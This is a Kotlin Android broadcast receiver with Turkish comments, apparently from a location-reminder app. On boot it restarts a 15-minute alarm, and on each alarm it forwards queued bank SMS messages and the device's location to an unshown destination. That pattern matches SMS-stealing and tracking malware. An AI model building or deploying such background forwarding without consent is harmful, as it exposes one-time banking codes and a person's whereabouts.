package tr.egemen.pusula

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

/**
 * 15 dakikalık konum alarmı ve telefon açılışı (13 Ekim, konuma bağlı hatırlatıcı).
 * Açılışta alarm yeniden kurulur (Android yeniden başlayınca alarmlar silinir); alarmda konum gönderilir.
 */
class LocationAlarmReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            LocationSender.schedule(context)
            return
        }
        val pending = goAsync()
        val app = context.applicationContext
        // 16 Ekim: kuyrukta kalan banka SMS'leri eskiden yalnızca yeni SMS gelince ya da uygulama açılınca
        // gönderiliyordu; artık 15 dakikada bir de denenir.
        Thread {
            try {
                SmsForwarder.flush(app)
            } finally {
                LocationSender.sendNow(app) { pending.finish() }
            }
        }.start()
    }
}
